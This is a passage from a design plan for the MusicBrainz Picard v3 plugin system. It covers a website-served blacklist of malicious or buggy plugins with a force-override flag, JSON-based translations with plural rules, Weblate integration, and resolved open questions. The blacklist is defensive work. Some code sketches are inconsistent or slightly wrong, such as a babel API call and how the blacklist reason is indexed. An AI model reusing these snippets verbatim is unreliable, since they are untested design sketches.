            reason = registry.get_blacklist_reason(plugin.git_url)

            # Check if user has explicitly overridden blacklist
            if self._is_blacklist_overridden(plugin.name):
                log.warning(
                    'Plugin "%s" is blacklisted but user has chosen to keep it enabled. '
                    'Reason: %s',
                    plugin.name, reason
                )
                # Continue loading
            else:
                # Auto-disable blacklisted plugin
                log.error(
                    'Plugin "%s" has been blacklisted and will be disabled. '
                    'Reason: %s',
                    plugin.name, reason['reason']
                )

                # Disable plugin
                self.disable_plugin(plugin)

                # Mark as auto-disabled in config
                self._mark_auto_disabled(plugin.name, reason)

                # Skip loading
                continue

        # Load plugin normally
        try:
            plugin.load_module()
            plugin.enable(self._tagger)
        except Exception as ex:
            log.error('Failed initializing plugin %s', plugin.name, exc_info=ex)
```

**User re-enable with override:**
```python
def enable_plugin(self, plugin: Plugin, override_blacklist=False):
    """Enable plugin, optionally overriding blacklist"""
    registry = PluginRegistry()

    if registry.is_blacklisted(plugin.git_url):
        if not override_blacklist:
            reason = registry.get_blacklist_reason(plugin.git_url)
            raise PluginBlacklistError(
                f"Plugin '{plugin.name}' is blacklisted: {reason['reason']}. "
                f"Use --force-blacklisted to override."
            )
        else:
            # User explicitly wants to enable blacklisted plugin
            log.warning('User is enabling blacklisted plugin "%s"', plugin.name)

            # Add to override list
            config = get_config()
            if 'blacklist_overrides' not in config.setting['plugins3']:
                config.setting['plugins3']['blacklist_overrides'] = []

            if plugin.name not in config.setting['plugins3']['blacklist_overrides']:
                config.setting['plugins3']['blacklist_overrides'].append(plugin.name)

    # Enable plugin normally
    plugin.load_module()
    plugin.enable(self._tagger)
```

**CLI commands:**
```bash
# Try to enable blacklisted plugin (fails)
$ picard plugins --enable malicious-plugin
ERROR: Plugin 'malicious-plugin' is blacklisted: Contains malicious code
Use --force-blacklisted to override (NOT RECOMMENDED)

# Force enable with override
$ picard plugins --enable malicious-plugin --force-blacklisted

⚠️  DANGER: You are enabling a BLACKLISTED plugin!

Plugin: malicious-plugin
Reason: Contains malicious code
Blacklisted: 2025-11-20

This plugin has been identified as dangerous by the Picard team.
Enabling it may compromise your system or data.

Are you ABSOLUTELY SURE you want to enable this plugin? [yes/NO] yes

⚠️  Plugin enabled. You are responsible for any consequences.

# Check which plugins are auto-disabled
$ picard plugins --list

Auto-disabled (blacklisted):
  ⛔ malicious-plugin - BLACKLISTED
     Reason: Contains malicious code
     Blacklisted: 2025-11-20
     Auto-disabled: 2025-11-24
```

---

**Blacklist checking for unregistered plugins:**

The blacklist can include URLs that were never in the registry:

```json
{
  "blacklist": [
    {
      "git_url": "https://github.com/badactor/malicious-plugin",
      "reason": "Contains malicious code that steals credentials",
      "blacklisted_at": "2025-11-20T10:00:00Z",
      "severity": "critical"
    },
    {
      "git_url": "https://github.com/unknown/suspicious-repo",
      "reason": "Suspicious activity detected, under investigation",
      "blacklisted_at": "2025-11-22T14:30:00Z",
      "severity": "high"
    }
  ],
  "ref_blacklist": [
    {
      "git_url": "https://github.com/metabrainz/picard-plugin-lastfm",
      "refs": ["v2.0.0", "v2.0.1"],
      "reason": "Critical bug causes data corruption",
      "blacklisted_at": "2025-11-23T10:00:00Z",
      "severity": "high",
      "fixed_in": "v2.0.2"
    },
    {
      "git_url": "https://github.com/user/picard-plugin-discogs",
      "refs": ["bad-experiment"],
      "reason": "Experimental branch with known issues",
      "blacklisted_at": "2025-11-20T15:00:00Z",
      "severity": "medium"
    }
  ]
}
```

This allows blacklisting:
- Plugins that were in registry but removed
- Unregistered plugins that are known to be malicious
- Suspicious repositories before they're widely installed
- **Specific versions/refs of otherwise good plugins**

---

**Ref-level blacklisting:**

Sometimes a specific version of a plugin has a critical bug, but the plugin itself is fine. The registry supports blacklisting specific refs:

```python
def is_ref_blacklisted(self, git_url, ref):
    """Check if specific ref of a plugin is blacklisted"""
    registry = self.fetch_registry()
    for entry in registry.get('ref_blacklist', []):
        if entry['git_url'] == git_url:
            if ref in entry['refs']:
                return True, entry
    return False, None

def get_safe_ref_suggestion(self, git_url, blacklisted_ref):
    """Get suggestion for safe ref to use instead"""
    registry = self.fetch_registry()
    for entry in registry.get('ref_blacklist', []):
        if entry['git_url'] == git_url and blacklisted_ref in entry['refs']:
            return entry.get('fixed_in')
    return None
```

**Behavior on install/update:**

```bash
# Try to install blacklisted ref
$ picard plugins --install https://github.com/user/plugin --ref v2.0.0

⚠️  WARNING: This version of the plugin is blacklisted!

Plugin: plugin
Version: v2.0.0
Reason: Critical bug causes data corruption
Blacklisted: 2025-11-23

This specific version has known issues.
Recommended version: v2.0.2

Install recommended version instead? [Y/n] y
Installing plugin from https://github.com/user/plugin (ref: v2.0.2)...
✓ Installed successfully

# Force install blacklisted ref
$ picard plugins --install https://github.com/user/plugin --ref v2.0.0 --force-blacklisted

⚠️  DANGER: You are installing a blacklisted version!
Reason: Critical bug causes data corruption
Continue? [yes/NO]
```

**Startup check for blacklisted refs:**

```python
def init_plugins(self):
    """Initialize plugins on startup"""
    registry = PluginRegistry()

    for plugin in self._plugins:
        # Check if entire plugin is blacklisted
        if registry.is_blacklisted(plugin.git_url):
            # ... existing code ...
            continue

        # Check if current ref is blacklisted
        current_ref = plugin.get_current_ref()
        is_blacklisted, reason = registry.is_ref_blacklisted(plugin.git_url, current_ref)

        if is_blacklisted:
            if self._is_blacklist_overridden(plugin.name):
                log.warning(
                    'Plugin "%s" ref "%s" is blacklisted but user has chosen to keep it. '
                    'Reason: %s',
                    plugin.name, current_ref, reason['reason']
                )
            else:
                log.error(
                    'Plugin "%s" ref "%s" is blacklisted and will be disabled. '
                    'Reason: %s. Fixed in: %s',
                    plugin.name, current_ref, reason['reason'],
                    reason.get('fixed_in', 'unknown')
                )

                # Suggest update
                fixed_in = reason.get('fixed_in')
                if fixed_in:
                    log.info(
                        'To fix, run: picard plugins --update %s --ref %s',
                        plugin.name, fixed_in
                    )

                # Disable plugin
                self.disable_plugin(plugin)
                self._mark_auto_disabled(plugin.name, reason)
                continue

        # Load plugin normally
        # ...
```

**List output shows blacklisted refs:**

```bash
$ picard plugins --list

Installed Plugins:

Auto-disabled (blacklisted version):
  ⛔ lastfm v2.0.0 - BLACKLISTED VERSION
     Reason: Critical bug causes data corruption
     Blacklisted: 2025-11-23
     Fixed in: v2.0.2

     To fix: picard plugins --update lastfm --ref v2.0.2
```

**Alternative design: Include/Exclude lists**

Instead of explicit blacklist, could use include/exclude patterns:

```json
{
  "git_url": "https://github.com/user/plugin",
  "ref_policy": {
    "include_refs": ["main", "v2.*"],  // Only allow main and v2.x tags
    "exclude_refs": ["v2.0.0", "v2.0.1", "experimental"],  // Except these
    "reason": "v2.0.0 and v2.0.1 have critical bugs",
    "recommended_ref": "v2.0.2"
  }
}
```

**Recommendation:** Use explicit `ref_blacklist` (simpler)

**Pros:**
- ✅ Simple and explicit
- ✅ Easy to understand
- ✅ Clear reason per blacklisted ref
- ✅ Can suggest fixed version

**Cons of include/exclude:**
- ❌ More complex to implement
- ❌ Pattern matching can be ambiguous
- ❌ Harder to explain to users

---

**Config structure:**
```python
config.setting['plugins3'] = {
    'enabled_plugins': ['lastfm', 'discogs'],
    'auto_disabled': {
        'malicious-plugin': {
            'reason': 'Contains malicious code',
            'blacklisted_at': '2025-11-20T10:00:00Z',
            'disabled_at': '2025-11-24T09:15:00Z'
        }
    },
    'blacklist_overrides': ['malicious-plugin'],  # User explicitly enabled
    'last_blacklist_check': '2025-11-24T09:15:00Z'
}
```

---

**Files to modify:**
- `picard/plugin3/manager.py` - Add blacklist checking to init_plugins()
- `picard/plugin3/cli.py` - Add --force-blacklisted flag to enable command
- `picard/plugin3/registry.py` - Add blacklist checking methods
- `picard/const/defaults.py` - Add auto_disabled and blacklist_overrides to config

**Acceptance criteria:**
- [ ] Blacklisted plugins are auto-disabled on startup
- [ ] User can override blacklist with explicit flag
- [ ] Override is remembered in config
- [ ] Clear warnings shown for blacklisted plugins
- [ ] Works for both registered and unregistered plugins
- [ ] Periodic check disables newly-blacklisted plugins

---

## Phase 4: GUI (Future)

**Goal:** User-friendly plugin management in Picard UI.

### 4.1 Options Page

**Tasks:**
- [ ] Create new plugin options page
- [ ] List installed plugins with enable/disable toggles
- [ ] Add install/uninstall buttons
- [ ] Show plugin details panel
- [ ] Add update notifications

---

## Open Questions & How to Resolve

### Q1: Should install/uninstall hooks exist?

**Current state:** Spec asks but not implemented
**Recommendation:** **NO** - Keep it simple. Plugins can do setup in `enable()` and cleanup in `disable()`.
**Rationale:** Adds complexity. Most plugins don't need it. Can add later if needed.
**Decision needed by:** Phase 1.1

---

### Q2: Is TOML the right format for MANIFEST?

**Current state:** TOML implemented, spec questions it
**Recommendation:** **YES, keep TOML**
**Rationale:**
- Already implemented and working
- Python 3.11+ has native support (tomllib)
- More human-readable than JSON
- Less complex than YAML
- Used by pyproject.toml (familiar to Python devs)

**Decision:** CLOSED - Keep TOML

---

### Q3: Localization - how should plugins provide translations?

**Current state:** TBD in spec
**Problem:** `.mo` files are compiled, binary, platform-specific, and not portable across Python versions
**Recommendation:** **Use JSON-based translations** - portable, human-readable, git-friendly

---

## Detailed Design: JSON Translation System

### File Structure

```
myplugin/
  __init__.py
  MANIFEST.toml
  translations/
    en.json          # English (required, fallback)
    de.json          # German
    fr.json          # French
    ja.json          # Japanese
    pt_BR.json       # Brazilian Portuguese
```

### Translation File Format

**Simple flat structure with dot notation for namespacing:**

```json
{
  "plugin_name": "Last.fm Scrobbler",
  "plugin_description": "Scrobble your music to Last.fm",

  "ui.menu.scrobble": "Scrobble Now",
  "ui.menu.configure": "Configure Last.fm",
  "ui.button.login": "Login to Last.fm",
  "ui.button.logout": "Logout",

  "options.title": "Last.fm Options",
  "options.username": "Username",
  "options.password": "Password",
  "options.enable_scrobbling": "Enable automatic scrobbling",

  "error.network": "Network error: {error}",
  "error.auth_failed": "Authentication failed. Please check your credentials.",
  "error.rate_limit": "Rate limit exceeded. Try again in {seconds} seconds.",

  "status.scrobbling": "Scrobbling: {artist} - {title}",
  "status.scrobbled": "Scrobbled {count} tracks",

  "message.login_success": "Successfully logged in as {username}",
  "message.confirm_logout": "Are you sure you want to logout?"
}
```

**Advantages of flat structure:**
- Simple to parse and use
- Easy to search for keys
- No nesting complexity
- Dot notation provides logical grouping

---

### PluginApi.gettext() Implementation

**In `picard/plugin3/api.py`:**

```python
class PluginApi:
    def __init__(self, manifest: PluginManifest, tagger) -> None:
        # ... existing code ...
        self._translations = {}
        self._current_locale = None
        self._load_translations()

    def _load_translations(self):
        """Load translation files for the plugin"""
        from picard.i18n import get_locale

        plugin_dir = Path(self._manifest.module_name)  # Plugin directory
        translations_dir = plugin_dir / 'translations'

        if not translations_dir.exists():
            return

        # Always load English as fallback
        en_file = translations_dir / 'en.json'
        if en_file.exists():
            with open(en_file, 'r', encoding='utf-8') as f:
                self._translations['en'] = json.load(f)

        # Load current locale
        self._current_locale = get_locale()
        locale_file = translations_dir / f'{self._current_locale}.json'

        if locale_file.exists():
            with open(locale_file, 'r', encoding='utf-8') as f:
                self._translations[self._current_locale] = json.load(f)
        else:
            # Try language without region (e.g., 'de' from 'de_DE')
            lang = self._current_locale.split('_')[0]
            lang_file = translations_dir / f'{lang}.json'
            if lang_file.exists():
                with open(lang_file, 'r', encoding='utf-8') as f:
                    self._translations[lang] = json.load(f)

    def gettext(self, key: str, **kwargs) -> str:
        """Get translated string for the given key.

        Args:
            key: Translation key (e.g., 'ui.button.login')
            **kwargs: Format parameters for string interpolation

        Returns:
            Translated and formatted string

        Example:
            text = api.gettext('error.network', error='Connection timeout')
            # Returns: "Network error: Connection timeout"
        """
        # Try current locale
        if self._current_locale in self._translations:
            text = self._translations[self._current_locale].get(key)
            if text:
                return text.format(**kwargs) if kwargs else text

        # Fallback to English
        if 'en' in self._translations:
            text = self._translations['en'].get(key)
            if text:
                return text.format(**kwargs) if kwargs else text

        # Last resort: return the key itself
        log.warning(f"Translation key not found: {key}")
        return key

    def reload_translations(self):
        """Reload translations when locale changes"""
        self._translations.clear()
        self._load_translations()
```

---

### Usage in Plugin Code

**Example 1: Simple text**
```python
from picard.plugin3.api import PluginApi

def enable(api: PluginApi) -> None:
    _ = api.gettext  # Shorthand alias

    # Simple translation
    button_text = _('ui.button.login')
    # Returns: "Login to Last.fm"
```

**Example 2: With parameters**
```python
def on_scrobble_complete(api: PluginApi, count: int):
    _ = api.gettext

    message = _('status.scrobbled', count=count)
    # Returns: "Scrobbled 5 tracks"
```

**Example 3: Error messages**
```python
def on_network_error(api: PluginApi, error: str):
    _ = api.gettext

    error_msg = _('error.network', error=error)
    # Returns: "Network error: Connection timeout"

    api.logger.error(error_msg)
```

**Example 4: In UI code**
```python
from PyQt6.QtWidgets import QPushButton

def create_ui(api: PluginApi):
    _ = api.gettext

    login_button = QPushButton(_('ui.button.login'))
    logout_button = QPushButton(_('ui.button.logout'))

    # For options page
    username_label = _('options.username')
    password_label = _('options.password')
```

---

### Handling Locale Changes

When user changes Picard's language, plugins need to reload translations:

```python
# In picard/plugin3/manager.py
def on_locale_changed(self):
    """Called when user changes language in Picard settings"""
    for plugin in self._plugins:
        if plugin.is_enabled():
            plugin.api.reload_translations()
            # Optionally: trigger UI refresh
```

---

### Translation File Guidelines for Plugin Developers

**1. Always provide `en.json` as fallback**
```json
{
  "plugin_name": "My Plugin",
  "error.generic": "An error occurred"
}
```

**2. Use consistent key naming:**
- `ui.*` - User interface elements (buttons, labels, menus)
- `options.*` - Settings/options page
- `error.*` - Error messages
- `status.*` - Status messages
- `message.*` - User notifications
- `help.*` - Help text

**3. Use placeholders for dynamic content:**
```json
{
  "status.processing": "Processing {filename}...",
  "error.file_not_found": "File not found: {path}",
  "message.saved": "Saved {count} files successfully"
}
```

**4. Keep translations in sync:**
- All translation files should have the same keys
- Missing keys will fall back to English
- Use comments in git commits to explain context

---

### Alternative: Nested JSON Structure

If preferred, could use nested structure for better organization:

```json
{
  "ui": {
    "menu": {
      "scrobble": "Scrobble Now",
      "configure": "Configure Last.fm"
    },
    "button": {
      "login": "Login to Last.fm",
      "logout": "Logout"
    }
  },
  "error": {
    "network": "Network error: {error}",
    "auth_failed": "Authentication failed"
  }
}
```

**Access with dot notation:**
```python
text = _('ui.menu.scrobble')
# Implementation splits on '.' and traverses nested dict
```

**Recommendation:** Start with flat structure (simpler), can migrate to nested later if needed.

---

### Comparison with gettext (.mo files)

| Feature | JSON | gettext (.mo) |
|---------|------|---------------|
| Portability | ✅ Text, works everywhere | ❌ Binary, platform-specific |
| Git-friendly | ✅ Text diffs | ❌ Binary diffs |
| Compilation | ✅ None needed | ❌ Requires msgfmt |
| Editing | ✅ Any text editor | ⚠️ Needs .po editor or manual |
| Tooling | ✅ Standard JSON tools | ⚠️ Specialized gettext tools |
| Performance | ✅ Fast (cached in memory) | ✅ Fast (binary format) |
| Plurals | ⚠️ Manual (multiple keys) | ✅ Built-in plural forms |
| Context | ⚠️ Manual (key naming) | ✅ Built-in msgctxt |
| Maturity | ⚠️ Custom implementation | ✅ Industry standard |

**Trade-off:** JSON sacrifices some advanced gettext features (plural forms, context) for simplicity and portability. For plugin translations, this is acceptable.

---

### Handling Plurals

Different languages have different plural rules. English has 2 forms (one/other), but Polish has 3, Arabic has 6, etc.

**Solution: Use CLDR plural rules with separate keys per form**

#### JSON Format with Plural Forms

```json
{
  "file.count": {
    "zero": "No files",
    "one": "1 file",
    "few": "{count} pliki",
    "many": "{count} plików",
    "other": "{count} files"
  },
  "track.scrobbled": {
    "one": "Scrobbled 1 track",
    "other": "Scrobbled {count} tracks"
  }
}
```

#### PluginApi.ngettext() Implementation

```python
# In picard/plugin3/api.py

# CLDR plural rules for common languages
PLURAL_RULES = {
    'en': lambda n: 'one' if n == 1 else 'other',
    'de': lambda n: 'one' if n == 1 else 'other',
    'fr': lambda n: 'one' if n in (0, 1) else 'other',
    'pl': lambda n: (
        'one' if n == 1 else
        'few' if n % 10 in (2, 3, 4) and n % 100 not in (12, 13, 14) else
        'many' if n != 1 and n % 10 in (0, 1) or n % 10 in (5, 6, 7, 8, 9) or n % 100 in (12, 13, 14) else
        'other'
    ),
    'ru': lambda n: (
        'one' if n % 10 == 1 and n % 100 != 11 else
        'few' if n % 10 in (2, 3, 4) and n % 100 not in (12, 13, 14) else
        'many'
    ),
    'ar': lambda n: (
        'zero' if n == 0 else
        'one' if n == 1 else
        'two' if n == 2 else
        'few' if 3 <= n % 100 <= 10 else
        'many' if 11 <= n % 100 <= 99 else
        'other'
    ),
    'ja': lambda n: 'other',  # Japanese has no plural forms
    'zh': lambda n: 'other',  # Chinese has no plural forms
}

class PluginApi:
    def ngettext(self, key: str, count: int, **kwargs) -> str:
        """Get translated string with plural support.

        Args:
            key: Translation key for plural forms
            count: Number to determine plural form
            **kwargs: Additional format parameters

        Returns:
            Translated and formatted string with correct plural form

        Example:
            text = api.ngettext('file.count', 5)
            # English: "5 files"
            # Polish: "5 plików"
        """
        # Get plural rule for current locale
        lang = self._current_locale.split('_')[0]
        plural_rule = PLURAL_RULES.get(lang, PLURAL_RULES['en'])

        # Determine plural form
        form = plural_rule(count)

        # Try current locale
        if self._current_locale in self._translations:
            plural_data = self._translations[self._current_locale].get(key)
            if isinstance(plural_data, dict):
                text = plural_data.get(form) or plural_data.get('other')
                if text:
                    return text.format(count=count, **kwargs)

        # Fallback to English
        if 'en' in self._translations:
            plural_data = self._translations['en'].get(key)
            if isinstance(plural_data, dict):
                text = plural_data.get(form) or plural_data.get('other')
                if text:
                    return text.format(count=count, **kwargs)

        # Last resort
        log.warning(f"Plural translation not found: {key}")
        return f"{count} {key}"
```

#### Usage Examples

**Simple case (English/German - 2 forms):**

```json
{
  "file.count": {
    "one": "1 file",
    "other": "{count} files"
  }
}
```

```python
_ = api.ngettext
print(_('file.count', 0))   # "0 files"
print(_('file.count', 1))   # "1 file"
print(_('file.count', 5))   # "5 files"
```

**Complex case (Polish - 3 forms):**

```json
{
  "file.count": {
    "one": "1 plik",
    "few": "{count} pliki",
    "many": "{count} plików"
  }
}
```

```python
_ = api.ngettext
print(_('file.count', 1))   # "1 plik"
print(_('file.count', 2))   # "2 pliki"
print(_('file.count', 5))   # "5 plików"
print(_('file.count', 22))  # "22 pliki"
print(_('file.count', 25))  # "25 plików"
```

**Very complex case (Arabic - 6 forms):**

```json
{
  "file.count": {
    "zero": "لا ملفات",
    "one": "ملف واحد",
    "two": "ملفان",
    "few": "{count} ملفات",
    "many": "{count} ملف",
    "other": "{count} ملف"
  }
}
```

#### Alternative: Use babel Library

Instead of maintaining plural rules manually, use the `babel` library which has complete CLDR plural rules:

```python
from babel.plural import PluralRule

class PluginApi:
    def __init__(self, manifest: PluginManifest, tagger) -> None:
        # ... existing code ...
        self._plural_rule = PluralRule.parse(
            PluralRule.get(self._current_locale)
        )

    def ngettext(self, key: str, count: int, **kwargs) -> str:
        """Get translated string with plural support using babel"""
        # Get plural form using babel
        form = self._plural_rule(count)

        # Rest of implementation same as above
        # ...
```

**Advantages of babel:**
- ✅ Complete CLDR plural rules for all languages
- ✅ Maintained by i18n experts
- ✅ No need to manually code rules
- ✅ Handles edge cases correctly

**Disadvantage:**
- ⚠️ Adds dependency on babel library

**Recommendation:** Use babel if acceptable, otherwise implement common languages manually.

#### Weblate Support for Plurals

Weblate fully supports plural forms in JSON:

**Configuration:**
```ini
[weblate]
plural_forms = nplurals=3; plural=(n==1 ? 0 : n%10>=2 && n%10<=4 && (n%100<10 || n%100>=20) ? 1 : 2);
```

**Weblate UI shows:**
```
Key: file.count
Plural forms for Polish:

Form 0 (one): [1 plik]
Form 1 (few): [{count} pliki]
Form 2 (many): [{count} plików]
```

Translators see all plural forms and can fill them in appropriately.

#### Fallback Strategy

If a plural form is missing, fall back gracefully:

```python
def ngettext(self, key: str, count: int, **kwargs) -> str:
    # ... determine form ...

    # Try specific form
    text = plural_data.get(form)
    if text:
        return text.format(count=count, **kwargs)

    # Fallback to 'other' form
    text = plural_data.get('other')
    if text:
        return text.format(count=count, **kwargs)

    # Fallback to 'one' form with count
    text = plural_data.get('one')
    if text:
        return text.format(count=count, **kwargs)

    # Last resort
    return f"{count} {key}"
```

#### Comparison with gettext

| Feature | JSON + CLDR | gettext |
|---------|-------------|---------|
| Plural support | ✅ Full CLDR rules | ✅ Full CLDR rules |
| Complexity | ⚠️ Manual rules or babel | ✅ Built-in |
| Portability | ✅ JSON files | ❌ Binary .mo |
| Translator tools | ✅ Weblate | ✅ Weblate + Poedit |
| Implementation | ⚠️ Custom code | ✅ Standard library |

**Conclusion:** JSON + babel provides equivalent plural support to gettext while maintaining portability advantages.

---

**Recommendation:**
1. Use babel library for plural rules (add to dependencies)
2. Support nested dict format for plurals in JSON
3. Document plural forms in plugin dev guide
4. Configure Weblate to handle plural forms

**Implementation effort:** +0.5 days to Phase 2 (add babel integration)

---

**Decision needed by:** Phase 2 (before GUI, but design now)
**Implementation effort:** 1-2 days

---

### Weblate Integration for Plugin Translations

**Yes, JSON translations work perfectly with Weblate!**

Weblate has native support for JSON translation files and can be used for plugin translations.

#### How It Works

**1. Plugin Repository Structure:**
```
picard-plugin-lastfm/
  __init__.py
  MANIFEST.toml
  translations/
    en.json          # Source language
    de.json          # Auto-updated by Weblate
    fr.json          # Auto-updated by Weblate
    ja.json          # Auto-updated by Weblate
```

**2. Weblate Configuration:**

Add `.weblate` file to plugin repository:
```ini
[weblate]
url = https://translations.musicbrainz.org/
translation_project = picard-plugins
component_name = lastfm
```

Or configure via Weblate web interface:
- **File format:** JSON (nested or flat)
- **File mask:** `translations/*.json`
- **Base file:** `translations/en.json`
- **Template:** `translations/en.json`
- **New translation:** Create new file from template

**3. Workflow:**

```
Developer writes code
    ↓
Updates en.json with new keys
    ↓
Commits to git
    ↓
Weblate detects changes
    ↓
Translators translate via Weblate UI
    ↓
Weblate commits translations back to git
    ↓
Plugin updates include new translations
```

#### Advantages of Weblate + JSON

- ✅ **Web-based translation UI** - Translators don't need to edit files manually
- ✅ **Translation memory** - Reuses translations across plugins
- ✅ **Automatic commits** - Translations pushed back to git automatically
- ✅ **Quality checks** - Detects missing placeholders, formatting issues
- ✅ **Collaboration** - Multiple translators can work simultaneously
- ✅ **Progress tracking** - See completion percentage per language
- ✅ **Notifications** - Alerts when new strings need translation
- ✅ **Git integration** - Works with GitHub, GitLab, etc.
- ✅ **No compilation** - JSON files work directly, no .mo generation needed

#### MusicBrainz Weblate Instance

MusicBrainz already runs Weblate at https://translations.musicbrainz.org/ for:
- Picard core
- MusicBrainz website
- Other MB projects

**Proposal:** Add "Picard Plugins" project to existing Weblate instance with components for each official plugin.

#### Setup for Plugin Developers

**For official plugins:**
1. Plugin gets added to MusicBrainz Weblate
2. Weblate automatically syncs with plugin git repo
3. Translators translate via web UI
4. Translations auto-commit to plugin repo
5. Plugin updates include latest translations

**For third-party plugins:**
1. Developer can use their own Weblate instance
2. Or use Weblate's hosted service (https://hosted.weblate.org/)
3. Or manage translations manually via git

#### Example: Weblate JSON Format

Weblate supports both flat and nested JSON. For flat structure:

**en.json:**
```json
{
  "ui.button.login": "Login to Last.fm",
  "error.network": "Network error: {error}"
}
```

**Weblate UI shows:**
```
Key: ui.button.login
Source (English): Login to Last.fm
Translation (German): [Bei Last.fm anmelden]

Key: error.network
Source (English): Network error: {error}
Translation (German): [Netzwerkfehler: {error}]
```

Weblate validates that placeholders like `{error}` are preserved in translations.

#### Integration with Plugin Registry

The plugin registry (Phase 3) could show translation status:

```json
{
  "id": "lastfm",
  "name": "Last.fm",
  "git_url": "https://github.com/metabrainz/picard-plugin-lastfm",
  "translations": {
    "available": ["en", "de", "fr", "ja", "pt_BR"],
    "completion": {
      "de": 100,
      "fr": 95,
      "ja": 80,
      "pt_BR": 60
    },
    "weblate_url": "https://translations.musicbrainz.org/projects/picard-plugins/lastfm/"
  }
}
```

#### Comparison: JSON vs .po/.mo with Weblate

| Feature | JSON + Weblate | .po/.mo + Weblate |
|---------|----------------|-------------------|
| Weblate support | ✅ Native | ✅ Native |
| Portability | ✅ Text files | ❌ Binary .mo files |
| Git-friendly | ✅ Text diffs | ⚠️ .po text, .mo binary |
| Compilation | ✅ None | ❌ Requires msgfmt |
| Direct use | ✅ Load JSON directly | ❌ Must compile .po → .mo |
| Translator tools | ✅ Weblate UI | ✅ Weblate UI + Poedit |
| Plural forms | ⚠️ Manual | ✅ Built-in |

**Conclusion:** JSON works excellently with Weblate and avoids the .mo compilation/portability issues.

#### Recommendation for Weblate Integration

**Phase 2 Task:** Set up Weblate integration for official plugins
- Add "Picard Plugins" project to translations.musicbrainz.org
- Configure components for each official plugin
- Document process for plugin developers
- Add translation status to plugin registry API

**Decision:** JSON + Weblate is the recommended solution for plugin translations.

---

### Q4: Plugin life cycle details?

**Current state:** TBD in spec
**Recommendation:** Define minimal state machine:

```
DISCOVERED → LOADED → ENABLED
                ↓         ↓
            ERROR    DISABLED
```

- **DISCOVERED:** Found in directory, manifest read, not loaded
- **LOADED:** Module imported, ready to enable
- **ENABLED:** `enable()` called, hooks registered
- **DISABLED:** `disable()` called, hooks unregistered
- **ERROR:** Failed to load or enable

**Decision needed by:** Phase 1.5

---

### Q5: Blacklisting plugins?

**Current state:** TBD in spec
**Decision:** **Implement via website plugin registry** (Phase 3)

**Design:**
- Blacklist maintained on Picard website, not in codebase
- Website serves blacklist as part of plugin registry JSON
- Picard checks blacklist before install and on startup
- Blacklisted plugins can be force-installed with `--force-blacklisted` flag
- Provides centralized, updateable security without app updates

**Advantages:**
- ✅ Can blacklist plugins immediately without Picard release
- ✅ Centralized management by MusicBrainz team
- ✅ Users get protection automatically
- ✅ Can include detailed reasons and timestamps
- ✅ Can be updated independently of Picard

**Implementation:** See Phase 3.4

**Decision:** CLOSED - Website-based blacklist

---

### Q6: Categorization and Trust Levels (PW-12)?

**Current state:** Mentioned but not defined
**Decision:** **Implement both category and trust level** (Phase 3)

**Categories (functional):**
- `metadata` - Metadata providers and processors
- `coverart` - Cover art providers
- `ui` - User interface enhancements
- `scripting` - Script functions and variables
- `formats` - File format support
- `other` - Miscellaneous

**Trust Levels (security/quality):**
- `picard_team` - Reviewed by Picard team
- `trusted_author` - Known authors, not reviewed
- `community` - Other authors, not reviewed

**Usage:**
- Category: For filtering/browsing ("show me all metadata plugins")
- Trust level: For security warnings ("this plugin is not reviewed")

**Implementation:**
- Category stored in MANIFEST.toml (plugin developer sets)
- Trust level stored in registry (website admin sets)
- Both used for filtering in CLI and GUI

**Decision:** CLOSED - Dual classification system

---

### Q7: Extra data files API?

**Current state:** Spec asks if needed
**Recommendation:** **NO special API needed**
**Rationale:**
- Plugins can use `pathlib.Path(__file__).parent / 'data.json'`
- Standard Python approach works fine
- Document pattern in plugin dev guide

**Decision:** CLOSED - No special API

---

### Q8: Additional extension points?

**Current state:** Spec asks which others
**Recommendation:** **Add as needed** - current set covers 90% of use cases
**Process:**
1. Wait for plugin developer requests
2. Evaluate if existing extension points can be used
3. Add new extension point if justified
4. Document in PluginApi

**Decision:** ONGOING - reactive approach

---

### Q9: ZIP plugin support?

**Current state:** Spec discusses pros/cons
**Recommendation:** **NO** - git-only for v3
**Rationale:**
- Git provides versioning, updates, and provenance
- Simpler implementation
- Can add ZIP support later if needed (e.g., for offline installs)
- Most developers already use git

**Decision needed by:** Phase 1 (document decision)

---

### Q10: Manifest field inconsistencies?

**Current state:** Spec shows `authors` (array) but code uses `author` (string)
**Recommendation:** **Use singular `author` (string)**
**Rationale:**
- Simpler for most plugins (single author)
- Can use comma-separated string for multiple: `"Alice, Bob"`
- Consistent with pyproject.toml which uses string

**Decision needed by:** Phase 1.3 (update spec)

---

### Q11: Multi-lingual `name` field?

**Current state:** Spec shows table, test uses string
**Recommendation:** **Use simple string for name**
**Rationale:**
- Plugin names are typically English identifiers
- Description already supports i18n
- Simpler for developers

**Decision needed by:** Phase 1.3 (update spec)

---

### Q12: Legacy plugin coexistence?

**Current state:** Both managers initialized
**Decision:** **Picard 3 breaks compatibility, provide migration tools**

**Approach:**

**1. Clean Break**
- Picard 3.0 only supports plugin API v3
- Legacy plugins (v1/v2) will NOT load
- Remove legacy PluginManager from codebase

**2. Migration Period**
- Picard 2.x and 3.0 released in parallel for transition
- Users can stay on 2.x until plugins migrate
- Clear communication about breaking change

**3. Migration Tools for Plugin Developers**

Provide tools to help developers migrate:

**A) Migration Guide Document**
- Side-by-side API comparison
- Common patterns and their v3 equivalents
- Step-by-step migration checklist

**B) Automated Migration Script (Best Effort)**

```bash
# Convert plugin structure
picard-plugin-migrate /path/to/old-plugin /path/to/new-plugin
```

**What it can do:**
- ✅ Create new directory structure
- ✅ Generate MANIFEST.toml from old metadata
- ✅ Convert simple API calls
- ✅ Flag incompatible code for manual review

**What it cannot do:**
- ❌ Complex logic changes
- ❌ UI code (Qt5 → Qt6 changes)
- ❌ Deprecated API usage

**Example migration script:**

```python
#!/usr/bin/env python3
"""Migrate Picard v2 plugin to v3 format"""

import os
import re
from pathlib import Path

def migrate_plugin(old_path, new_path):
    """Migrate plugin from v2 to v3"""

    # 1. Extract metadata from old plugin
    metadata = extract_v2_metadata(old_path)

    # 2. Create v3 structure
    create_v3_structure(new_path, metadata)

    # 3. Convert code
    convert_plugin_code(old_path, new_path)

    # 4. Generate migration report
    generate_report(new_path)

def extract_v2_metadata(plugin_path):
    """Extract metadata from v2 plugin __init__.py"""
    init_file = Path(plugin_path) / '__init__.py'

    with open(init_file) as f:
        code = f.read()

    # Parse old metadata format
    metadata = {}
    metadata['name'] = re.search(r'PLUGIN_NAME\s*=\s*["\'](.+?)["\']', code).group(1)
    metadata['author'] = re.search(r'PLUGIN_AUTHOR\s*=\s*["\'](.+?)["\']', code).group(1)
